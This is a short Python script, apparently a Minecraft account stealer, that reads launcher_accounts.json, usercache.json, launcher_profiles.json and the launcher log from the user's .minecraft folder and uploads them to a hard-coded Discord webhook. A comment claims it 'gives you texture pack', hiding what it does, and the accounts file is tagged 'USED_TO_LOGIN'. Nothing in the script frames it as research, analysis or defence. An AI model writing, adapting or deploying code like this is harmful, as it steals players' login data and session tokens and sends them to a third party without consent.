import os
import re
import platform
import os, json
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1094968393670610984/DKlrKvPohESHU9F2OH1I2zVlKQgIe2SanzLq90BKGGp7arnAt4yWiSp3aTkXe67WKVkC')

# setup paths
apd = os.getenv('APPDATA')
mc = apd + "\.minecraft\\"

# gives you texture pack
files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
for x in files:
    with open(mc + x, "rb") as f:
        if (x == 'launcher_accounts.json'):
            x = f"USED_TO_LOGIN-{x}"
        webhook.add_file(file=f.read(), filename=x)

response = webhook.execute()
